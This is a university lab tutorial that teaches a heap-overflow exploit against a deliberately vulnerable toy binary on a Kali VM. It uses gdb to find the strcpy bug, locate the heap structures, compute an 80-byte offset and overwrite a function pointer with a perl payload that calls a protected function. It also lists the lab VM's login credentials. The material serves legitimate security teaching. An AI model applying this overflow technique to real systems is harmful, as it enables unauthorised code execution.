Tutorial:  Heap overflow exploit - Function pointers
====================================================

Introduction
-------------

Download the Kali VM from this link (Same than NFS - Metasploitable)

.. centered:: https://transvol.sgsi.ucl.ac.be/download.php?id=cdb293424a0498c7

| Working directory: ``~/SecurityClass/Tutorial-Extra``
| Connection:

============ ============
**username** **password**
============ ============
admin        nimda
============ ============


In this exercise we will exploit a heap-based vulnerabilities to execute
a function that we should not be allowed to.

The ``exploit_func`` program takes password as a parameter and displays
*Auth : success* if it is correct, *Auth : failed* otherwise. For the
sake of simplicity we always deny every password but assume that there
is one.

If we take a look at the ``exploit_func.c`` file we can see two
structures as well as two functions, one of which is supposedly called
on authentication success. This will be our aim for this lab.

Exercise
--------

Finding vulnerable code
~~~~~~~~~~~~~~~~~~~~~~~

❓ **Can you spot which line of code is vulnerable to a heap-based overflow ?**


❓ **Try to see how much bytes your can put as parameter before crashing the
program.**

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_1">
          <div class="panel panel-primary">
        <div class="panel-body">

The following line ``strcpy(d->passwd, argv[1]);``\ is vulnerable to a
heap-overflow if the length of the input is not checked first which is
the case here.

We can try the program with a long input and see if we can get a
segmentation fault.

.. code:: console

   kali@kali:~/$ ./exploit_func password
   data is at 0x804d1a0, fp is at 0x804d1f0
   Auth : failed
   kali@kali:~/$ ./exploit_func $(perl -e 'print "A"x120')
   data is at 0x804d1a0, fp is at 0x804d1f0
   Segmentation fault

.. raw:: html

   </div>
   </div>
   </div>


Locate the heap in memory
~~~~~~~~~~~~~~~~~~~~~~~~~

❓ **Using** ``gdb`` **find the allocation instructions for the two structures and
how much bytes are allocated.**

❓ **Using** ``gdb`` **can you find a way to locate the address of the heap?**

.. hint:: **💡 You can put a breakpoint somewhere in the program and see the
          state of the registers as well as other usefull information regarding
          the stack and the heap. Once you find the heap you can take a look at
          its content easily.**

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_2">
          <div class="panel panel-primary">
        <div class="panel-body">


Using gdb we can disassemble the main function to see where the two
buffers are allocated.

.. code:: console

   (gdb) disass main
   Dump of assembler code for function main:
      0x080491e8 <+0>: lea    ecx,[esp+0x4]
      0x080491ec <+4>: and    esp,0xfffffff0
      0x080491ef <+7>: push   DWORD PTR [ecx-0x4]
      0x080491f2 <+10>:    push   ebp
      0x080491f3 <+11>:    mov    ebp,esp
      0x080491f5 <+13>:    push   esi
      0x080491f6 <+14>:    push   ebx
      0x080491f7 <+15>:    push   ecx
      0x080491f8 <+16>:    sub    esp,0x1c
      0x080491fb <+19>:    call   0x80490d0 <__x86.get_pc_thunk.bx>
      0x08049200 <+24>:    add    ebx,0x2e00
      0x08049206 <+30>:    mov    esi,ecx
      0x08049208 <+32>:    sub    esp,0xc
      0x0804920b <+35>:    push   0x40
      0x0804920d <+37>:    call   0x8049050 <malloc@plt>
      0x08049212 <+42>:    add    esp,0x10
      0x08049215 <+45>:    mov    DWORD PTR [ebp-0x1c],eax
      0x08049218 <+48>:    sub    esp,0xc
      0x0804921b <+51>:    push   0x4
      0x0804921d <+53>:    call   0x8049050 <malloc@plt>
      0x08049222 <+58>:    add    esp,0x10
      0x08049225 <+61>:    mov    DWORD PTR [ebp-0x20],eax
      0x08049228 <+64>:    mov    eax,DWORD PTR [ebp-0x20]
      0x0804922b <+67>:    lea    edx,[ebx-0x2e43]
      0x08049231 <+73>:    mov    DWORD PTR [eax],edx
      0x08049233 <+75>:    sub    esp,0x4
      0x08049236 <+78>:    push   DWORD PTR [ebp-0x20]
      0x08049239 <+81>:    push   DWORD PTR [ebp-0x1c]
      0x0804923c <+84>:    lea    eax,[ebx-0x1fdb]
      0x08049242 <+90>:    push   eax
      0x08049243 <+91>:    call   0x8049030 <printf@plt>
      0x08049248 <+96>:    add    esp,0x10
      0x0804924b <+99>:    mov    eax,DWORD PTR [esi+0x4]
      0x0804924e <+102>:   add    eax,0x4
      0x08049251 <+105>:   mov    edx,DWORD PTR [eax]
      0x08049253 <+107>:   mov    eax,DWORD PTR [ebp-0x1c]
      0x08049256 <+110>:   sub    esp,0x8
      0x08049259 <+113>:   push   edx
      0x0804925a <+114>:   push   eax
      0x0804925b <+115>:   call   0x8049040 <strcpy@plt>
      0x08049260 <+120>:   add    esp,0x10
      0x08049263 <+123>:   mov    eax,DWORD PTR [ebp-0x20]
      0x08049266 <+126>:   mov    eax,DWORD PTR [eax]
      0x08049268 <+128>:   call   eax
      0x0804926a <+130>:   mov    eax,0x0
      0x0804926f <+135>:   lea    esp,[ebp-0xc]
      0x08049272 <+138>:   pop    ecx
      0x08049273 <+139>:   pop    ebx
      0x08049274 <+140>:   pop    esi
      0x08049275 <+141>:   pop    ebp
      0x08049276 <+142>:   lea    esp,[ecx-0x4]
      0x08049279 <+145>:   ret    
   End of assembler dump.
   (gdb)

We find two calls to the malloc function (line 37, 53), each have
argument pushed before the call (line 35, 51). We can see how much
memory are allocated for each buffer by looking at the argument.

For the first one it is ``0x40 = 64`` and for the second one
``0x4 = 4``. (The second data structure consists of a pointer which on a
32-bit system is 32 bits or 4 bytes)

To locate the heap in memory we can set a breakpoint in the main
function somewhere after the two mallocs. Address ``0x0804925b`` is
suitable for example. We can now run the program and take a look at the
registers and process informations.

.. code:: console

   (gdb) b *0x0804925b
   Breakpoint 1 at 0x0804925b: file exploit_func.c, line 40.
   (gdb) info proc map
   process 2265
   Mapped address spaces:

       Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x804b000     0x3000        0x0 /home/kali/Documents/Security/LINGI2144-2020-2021/heap-exploit/function_pointer/exploit_func
        0x804b000  0x804c000     0x1000     0x2000 /home/kali/Documents/Security/LINGI2144-2020-2021/heap-exploit/function_pointer/exploit_func
        0x804c000  0x804d000     0x1000     0x3000 /home/kali/Documents/Security/LINGI2144-2020-2021/heap-exploit/function_pointer/exploit_func
        0x804d000  0x806f000    0x22000        0x0 [heap]
       0xb7dd7000 0xb7fb5000   0x1de000        0x0 /usr/lib/i386-linux-gnu/libc-2.30.so
       0xb7fb5000 0xb7fb7000     0x2000   0x1dd000 /usr/lib/i386-linux-gnu/libc-2.30.so
       0xb7fb7000 0xb7fb9000     0x2000   0x1df000 /usr/lib/i386-linux-gnu/libc-2.30.so
       0xb7fb9000 0xb7fbb000     0x2000        0x0 
       0xb7fd0000 0xb7fd2000     0x2000        0x0 
       0xb7fd2000 0xb7fd5000     0x3000        0x0 [vvar]
       0xb7fd5000 0xb7fd6000     0x1000        0x0 [vdso]
       0xb7fd6000 0xb7ffe000    0x28000        0x0 /usr/lib/i386-linux-gnu/ld-2.30.so
       0xb7ffe000 0xb7fff000     0x1000    0x27000 /usr/lib/i386-linux-gnu/ld-2.30.so
       0xb7fff000 0xb8000000     0x1000    0x28000 /usr/lib/i386-linux-gnu/ld-2.30.so
       0xbffdf000 0xc0000000    0x21000        0x0 [stack]

On the fourth line we can see that the heap is located at the address
``0x804d000``

.. raw:: html

   </div>
   </div>
   </div>

Locate the two structures
~~~~~~~~~~~~~~~~~~~~~~~~~

❓ **Using** ``gdb`` **can you locate the address of the two buffers?**

.. hint:: **💡 Recall that the second structure is a pointer to a function so
          maybe you should look at the addresses of both functions to see any
          resemblance..**

❓ **Find what's the distance between the two structures in memory.**

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_3">
          <div class="panel panel-primary">
        <div class="panel-body">

Now that we found the heap location we can display its content and see
if we can find the two structures :

.. code:: console

   gdb-peda$ x/120x 0x804d000
   0x804d000:  0x00000000  0x00000000  0x00000000  0x00000191
   [...]
   0x804d190:  0x00000000  0x00000000  0x00000000  0x00000051
   0x804d1a0:  0x41414141  0x00000000  0x00000000  0x00000000
   0x804d1b0:  0x00000000  0x00000000  0x00000000  0x00000000
   [...]
   0x804d1e0:  0x00000000  0x00000000  0x00000000  0x00000011
   0x804d1f0:  0x080491bd  0x00000000  0x00000000  0x00000411
   0x804d200:  0x61746164  0x20736920  0x30207461  0x34303878
   0x804d210:  0x30613164  0x7066202c  0x20736920  0x30207461
   0x804d220:  0x34303878  0x30663164  0x0000000a  0x00000000
   0x804d230:  0x00000000  0x00000000  0x00000000  0x00000000

We can spot our first buffer, our input, located at address
``0x804d1a0``\ and a bit further the second structure at address
``0x804d1f0``.

How do we know where the second strucutre is ? If we list the denied
function we can see the address of its first instruction :

.. code:: console

   (gdb) disass denied
   Dump of assembler code for function denied:
      0x080491bd <+0>: push   ebp
      0x080491be <+1>: mov    ebp,esp
      0x080491c0 <+3>: push   ebx
      0x080491c1 <+4>: sub    esp,0x4
      0x080491c4 <+7>: call   0x804927a <__x86.get_pc_thunk.ax>
      0x080491c9 <+12>:    add    eax,0x2e37
      0x080491ce <+17>:    sub    esp,0xc
      0x080491d1 <+20>:    lea    edx,[eax-0x1fe9]
      0x080491d7 <+26>:    push   edx
      0x080491d8 <+27>:    mov    ebx,eax
      0x080491da <+29>:    call   0x8049060 <puts@plt>
      0x080491df <+34>:    add    esp,0x10
      0x080491e2 <+37>:    nop
      0x080491e3 <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
      0x080491e6 <+41>:    leave  
      0x080491e7 <+42>:    ret    
   End of assembler dump.

We find the address ``0x080491bd`` which is the one appearing on the
heap at address ``0x804d1f0``.

We can now easily find the offset between the two structures :

.. code:: console

   (gdb) p/d 0x804d1f0 - 0x804d1a0
   $1 = 80

The offset is 80 because we have a buffer of 64 bytes and 16 bytes of
padding. To ensure that it is the correct offset we can run the program
in GDB with an offset of 80 and 4 additionnal recognizable bytes. (ABCD,
BBBB, ...)

.. code:: console

   (gdb) run $(perl -e 'print "A"x80 . "BCDE"')
   Stopped reason: SIGSEGV
   0x45444342 in ?? ()

We can see the offset is correct by looking at the address that caused
the segmentation fault.

.. raw:: html

   </div>
   </div>
   </div>

Crashing the program
~~~~~~~~~~~~~~~~~~~~

Now that you have found the distance between the two structures you
should be able to crash the program with control. To see if you
calculated your offset correctly you can open ``gdb`` and run it with a
string with the length of your offset and some distinguishable bytes.
You should be able to a segmentation fault with the four
dinstinguishable bytes as the address. If this is correct you just need
to replace the four bytes by a useful address, ``allowed`` for example.

❓ **Find the address of the** ``allowed`` **function.**

❓ **Execute the** ``allowed`` **function using your exploit.**

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_4">
          <div class="panel panel-primary">
        <div class="panel-body">

Just like the ``denied`` function we can find the address of the
``allowed function`` by disassembling it.

.. code:: console

   (gdb) disass allowed
   Dump of assembler code for function allowed:
      0x08049192 <+0>: push   ebp
      0x08049193 <+1>: mov    ebp,esp
      0x08049195 <+3>: push   ebx
      0x08049196 <+4>: sub    esp,0x4
      0x08049199 <+7>: call   0x804927a <__x86.get_pc_thunk.ax>
      0x0804919e <+12>:    add    eax,0x2e62
      0x080491a3 <+17>:    sub    esp,0xc
      0x080491a6 <+20>:    lea    edx,[eax-0x1ff8]
      0x080491ac <+26>:    push   edx
      0x080491ad <+27>:    mov    ebx,eax
      0x080491af <+29>:    call   0x8049060 <puts@plt>
      0x080491b4 <+34>:    add    esp,0x10
      0x080491b7 <+37>:    nop
      0x080491b8 <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
      0x080491bb <+41>:    leave  
      0x080491bc <+42>:    ret    
   End of assembler dump.

Here the address is ``0x08049192``.

To execute the ``allowed`` function we just need to replace the 4 bytes
after the offset by the address of the ``allowed`` function. (In little
endian)

.. code:: console

   kali@kali:~/$ ./exploit_func $(perl -e 'print "A"x80 . "\x92\x91\x04\x08"')
   data is at 0x804d1a0, fp is at 0x804d1f0
   Auth : success

.. raw:: html

   </div>
   </div>
   </div>

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     'updateSol("tp1_0_1 tp1_0_4 tp1_0_2 tp1_0_3",".tp1_s0","crashing-the-program");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>